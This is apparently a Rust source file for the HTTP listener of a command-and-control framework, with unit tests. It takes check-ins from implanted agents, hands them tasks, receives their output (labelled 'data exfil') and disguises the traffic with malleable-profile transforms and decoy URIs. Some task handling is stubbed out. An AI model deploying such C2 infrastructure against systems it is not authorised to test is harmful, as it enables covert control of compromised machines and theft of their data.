//! HTTP C2 handler with malleable profile integration.
//!
//! This module implements the HTTP-facing C2 handler that processes agent
//! checkins (GET) and task outputs (POST) through the malleable profile
//! transform pipeline.
//!
//! ## Request Flow
//!
//! **GET (agent checkin / task fetch):**
//! 1. Match the URI against the profile's `http_get.uri` list
//! 2. Extract the session ID from the configured delivery method
//! 3. Strip the client prepend/append and reverse the client transform
//! 4. Decrypt with the session key
//! 5. Queue any pending tasks
//! 6. Transform the tasking data through the server pipeline
//! 7. Send the response with the profile's Content-Type
//!
//! **POST (task output / data exfil):**
//! 1. Match the URI against the profile's `http_post.uri` list
//! 2. Extract the session ID from the configured delivery method
//! 3. Strip the client prepend/append and reverse the client transform
//! 4. Decrypt with the session key
//! 5. Process the task output
//! 6. Send a transformed acknowledgment response

use crate::malleable::{MultiProfileManager, TransactionTransformer};
use crate::state::AppState;
use axum::body::Bytes;
use axum::extract::State;
use axum::http::{HeaderMap, Response, StatusCode};
use axum::response::IntoResponse;
use axum::Router;
use std::collections::HashMap;
use std::sync::Arc;

/// Shared state for the HTTP C2 handler.
#[derive(Clone)]
pub struct HttpC2State {
    pub profile_manager: Arc<MultiProfileManager>,
    pub app_state: Arc<AppState>,
}

/// Build an axum Router for the HTTP C2 handler.
///
/// Uses a catch-all fallback handler that dispatches based on the HTTP method
/// and matches the URI against loaded profile configurations.
pub fn build_router(state: HttpC2State) -> Router {
    Router::new()
        .fallback(dispatch_c2_request)
        .with_state(state)
}

/// Top-level dispatcher that extracts request components and delegates.
async fn dispatch_c2_request(
    State(state): State<HttpC2State>,
    req: axum::extract::Request,
) -> axum::response::Response {
    let method = req.method().clone();
    let uri = req.uri().to_string();
    let path = req.uri().path().to_string();
    let headers = extract_headers(req.headers());
    let body = axum::body::to_bytes(req.into_body(), 16 * 1024 * 1024)
        .await
        .unwrap_or_default();

    match method.as_str() {
        "GET" => handle_get(&state, &path, &uri, &headers, &body).await,
        "POST" => handle_post(&state, &path, &uri, &headers, &body).await,
        _ => (
            StatusCode::METHOD_NOT_ALLOWED,
            [(axum::http::header::CONTENT_TYPE, "text/plain")],
            "Method Not Allowed",
        )
            .into_response(),
    }
}

/// Handle a GET request (agent checkin / task fetch).
///
/// 1. Match URI against http_get profiles
/// 2. Extract session ID from metadata delivery method
/// 3. Decode and strip client transforms from any body data
/// 4. Look up the session and queue pending tasks
/// 5. Transform the tasking response through the server pipeline
/// 6. Return with profile-appropriate Content-Type
async fn handle_get(
    state: &HttpC2State,
    path: &str,
    uri: &str,
    headers: &HashMap<String, String>,
    _body: &[u8],
) -> axum::response::Response {
    // Step 1: Find the matching profile and transaction.
    let (profile_name, transformer) = match find_matching_get_transformer(&state, path).await {
        Some(result) => result,
        None => {
            return (StatusCode::NOT_FOUND, "Not Found").into_response();
        }
    };

    // Step 2: Extract session ID from metadata.
    let session_id = match transformer
        .extract_metadata_from_headers(headers, uri, _body)
    {
        Ok(id) => id,
        Err(e) => {
            tracing::debug!("GET {}: metadata extraction failed: {}", path, e);
            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
        }
    };

    // Step 3: Touch the session.
    state
        .profile_manager
        .touch_session(&session_id)
        .await;

    tracing::debug!(
        "GET {} from agent session '{}' (profile '{}')",
        path,
        session_id,
        profile_name
    );

    // Step 4: Check for pending tasks.
    let task_data = match get_pending_task(&state, &session_id).await {
        Some(data) => data,
        None => {
            // No tasks — return an empty response with profile transform.
            let empty = transformer.transform_outbound(&[], &session_id);
            let content_type = transformer
                .content_type()
                .unwrap_or("application/octet-stream");
            return (
                StatusCode::OK,
                [(axum::http::header::CONTENT_TYPE, content_type)],
                Bytes::from(empty),
            )
                .into_response();
        }
    };

    // Step 5: Transform the tasking data through the server pipeline.
    let response_body = transformer.transform_outbound(&task_data, &session_id);

    // Step 6: Build the response with profile headers.
    let content_type = transformer
        .content_type()
        .unwrap_or("application/octet-stream");

    let mut builder = Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", content_type);

    // Add profile-configured headers.
    let profile_headers = transformer.build_headers(&session_id);
    for (key, value) in &profile_headers {
        if key.to_lowercase() != "content-type" {
            builder = builder.header(key.as_str(), value.as_str());
        }
    }

    builder
        .body(axum::body::Body::from(response_body))
        .unwrap()
        .into()
}

/// Handle a POST request (task output / data exfiltration).
///
/// 1. Match URI against http_post profiles
/// 2. Extract session ID from metadata delivery method
/// 3. Transform and decrypt the inbound data
/// 4. Process the task output
/// 5. Send a transformed acknowledgment response
async fn handle_post(
    state: &HttpC2State,
    path: &str,
    uri: &str,
    headers: &HashMap<String, String>,
    body: &[u8],
) -> axum::response::Response {
    // Step 1: Find the matching profile and transaction.
    let (profile_name, transformer) = match find_matching_post_transformer(&state, path).await {
        Some(result) => result,
        None => {
            return (StatusCode::NOT_FOUND, "Not Found").into_response();
        }
    };

    // Step 2: Extract session ID from metadata.
    let session_id = match transformer
        .extract_metadata_from_headers(headers, uri, body)
    {
        Ok(id) => id,
        Err(e) => {
            tracing::debug!("POST {}: metadata extraction failed: {}", path, e);
            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
        }
    };

    // Step 3: Transform and decrypt the inbound data.
    let decoded = match transformer.transform_inbound(body) {
        Ok(data) => data,
        Err(e) => {
            tracing::warn!(
                "POST {}: transform_inbound failed for session '{}': {}",
                path,
                session_id,
                e
            );
            return (StatusCode::BAD_REQUEST, "Bad Request").into_response();
        }
    };

    // Step 4: Touch the session and process the output.
    state
        .profile_manager
        .touch_session(&session_id)
        .await;

    tracing::debug!(
        "POST {} from agent session '{}' (profile '{}', {} bytes)",
        path,
        session_id,
        profile_name,
        decoded.len()
    );

    // Process the task output through the app state.
    process_task_output(&state, &session_id, &decoded).await;

    // Step 5: Send a transformed acknowledgment response.
    let ack = transformer.transform_outbound(b"ACK", &session_id);
    let content_type = transformer
        .content_type()
        .unwrap_or("application/octet-stream");

    (
        StatusCode::OK,
        [(axum::http::header::CONTENT_TYPE, content_type)],
        Bytes::from(ack),
    )
        .into_response()
}

// ── Helper Functions ─────────────────────────────────────────────────────────

/// Extract header values into a HashMap.
fn extract_headers(headers: &HeaderMap) -> HashMap<String, String> {
    let mut map = HashMap::new();
    for (key, value) in headers {
        if let Ok(v) = value.to_str() {
            map.insert(key.to_string(), v.to_string());
        }
    }
    map
}

/// Find a matching GET transformer for the given URI path.
async fn find_matching_get_transformer(
    state: &HttpC2State,
    path: &str,
) -> Option<(String, TransactionTransformer)> {
    let names = state.profile_manager.profile_names().await;
    for name in &names {
        if let Ok(transformer) = state
            .profile_manager
            .get_transformer(name, "http_get")
            .await
        {
            if transformer.matches_uri(path) {
                return Some((name.clone(), transformer));
            }
        }
    }
    None
}

/// Find a matching POST transformer for the given URI path.
async fn find_matching_post_transformer(
    state: &HttpC2State,
    path: &str,
) -> Option<(String, TransactionTransformer)> {
    let names = state.profile_manager.profile_names().await;
    for name in &names {
        if let Ok(transformer) = state
            .profile_manager
            .get_transformer(name, "http_post")
            .await
        {
            if transformer.matches_uri(path) {
                return Some((name.clone(), transformer));
            }
        }
    }
    None
}

/// Get pending task data for a session.
///
/// In a full implementation, this would query the AppState's pending task
/// queue for the given session and serialize the tasks.
async fn get_pending_task(state: &HttpC2State, session_id: &str) -> Option<Vec<u8>> {
    // Look up the agent by session_id (mapped to connection_id or agent_id).
    // For now, check the pending tasks in AppState.
    let entry = state
        .app_state
        .registry
        .iter()
        .find(|e| e.value().agent_id == session_id || e.key() == session_id)?;

    // Check if there's a pending task for this agent.
    let connection_id = entry.key().clone();
    let tx = &entry.value().tx;

    // Try to send a TaskRequest and get the response.
    // In the full implementation, this would use the pending task channel.
    // For now, return None to indicate no pending tasks.
    let _ = tx;
    drop(entry);

    // Check pending map for this connection.
    if state.app_state.pending.contains_key(&connection_id) {
        // There's a pending response — serialize it.
        // This is a placeholder; the actual implementation would
        // integrate with the command dispatch system.
        return Some(b"pending_task_data".to_vec());
    }

    None
}

/// Process task output received from an agent.
///
/// In a full implementation, this would deserialize the output, resolve
/// the pending task, and forward the result to the operator.
async fn process_task_output(state: &HttpC2State, session_id: &str, output: &[u8]) {
    tracing::info!(
        "received {} bytes of task output from session '{}'",
        output.len(),
        session_id
    );

    // Look up the agent entry.
    let entry = state
        .app_state
        .registry
        .iter()
        .find(|e| e.value().agent_id == session_id || e.key() == session_id);

    if let Some(entry) = entry {
        let connection_id = entry.key().clone();
        drop(entry);

        // Complete the pending task if one exists.
        if let Some((_task_id, sender)) = state.app_state.pending.remove(&connection_id) {
            let output_str = String::from_utf8_lossy(output).to_string();
            let _ = sender.send(Ok(output_str));
        }
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::malleable::MalleableProfile;

    fn test_profile_toml() -> &'static str {
        r#"
[profile]
name = "test_http"
author = "tester"
description = "Test HTTP profile"

[profile.global]
user_agent = "TestAgent/1.0"
jitter = 10
sleep_time = 30

[profile.ssl]
enabled = false

[profile.http_get]
uri = ["/api/v1/data", "/static/asset.js"]
verb = "GET"

[profile.http_get.headers]
"Accept" = "application/json"
"Content-Type" = "text/html"

[profile.http_get.client]
prepend = "HEADER_"
append = "_FOOTER"
transform = "base64"

[profile.http_get.server]
prepend = "RESP_"
append = "_END"
transform = "base64"

[profile.http_get.metadata]
delivery = "cookie"
key = "session"
transform = "base64"

[profile.http_post]
uri = ["/api/v1/upload"]
verb = "POST"

[profile.http_post.headers]
"Content-Type" = "application/octet-stream"

[profile.http_post.client]
prepend = ""
append = ""
transform = "base64"

[profile.http_post.server]
prepend = ""
append = ""
transform = "none"

[profile.http_post.metadata]
delivery = "header"
key = "X-Session"
transform = "base64"

[profile.dns]
enabled = false
"#
    }

    #[test]
    fn test_transform_outbound_server_pipeline() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let data = b"task data for agent";
        let outbound = transformer.transform_outbound(data, "test-session");
        assert!(outbound.starts_with(b"RESP_"));
        assert!(outbound.ends_with(b"_END"));

        // Decode to verify round-trip.
        let decoded = transformer.decode_server(&outbound).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_inbound_client_pipeline() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let data = b"agent output data";
        let encoded = transformer.encode_client(data);
        let decoded = transformer.transform_inbound(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_transform_inbound_error_on_bad_prepend() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        // Data without the expected prepend.
        let bad_data = b"no_header_here";
        let result = transformer.transform_inbound(bad_data);
        assert!(result.is_err());
    }

    #[test]
    fn test_encode_decode_metadata() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let session_id = "abc-123-def";
        let encoded = transformer.encode_metadata(session_id);
        let decoded = transformer.decode_metadata(&encoded).unwrap();
        assert_eq!(decoded, session_id);
    }

    #[test]
    fn test_matches_uri() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        assert!(transformer.matches_uri("/api/v1/data"));
        assert!(transformer.matches_uri("/static/asset.js"));
        assert!(transformer.matches_uri("/api/v1/data?foo=bar"));
        assert!(!transformer.matches_uri("/api/v2/data"));
        assert!(!transformer.matches_uri("/login"));
    }

    #[test]
    fn test_extract_metadata_from_cookie() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let get_cfg = profile.http_get.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(get_cfg);

        let session_id = "test-session-42";
        let encoded = transformer.encode_metadata(session_id);

        let mut headers = HashMap::new();
        headers.insert("Cookie".to_string(), format!("session={}; path=/", encoded));

        let result = transformer
            .extract_metadata_from_headers(&headers, "/api/v1/data", &[])
            .unwrap();
        assert_eq!(result, session_id);
    }

    #[test]
    fn test_extract_metadata_from_header() {
        let profile = MalleableProfile::from_toml(test_profile_toml()).unwrap();
        let post_cfg = profile.http_post.as_ref().unwrap().clone();
        let transformer = TransactionTransformer::new(post_cfg);

        let session_id = "post-session-99";
        let encoded = transformer.encode_metadata(session_id);

        let mut headers = HashMap::new();
        headers.insert("X-Session".to_string(), encoded);

        let result = transformer
            .extract_metadata_from_headers(&headers, "/api/v1/upload", &[])
            .unwrap();
        assert_eq!(result, session_id);
    }
}
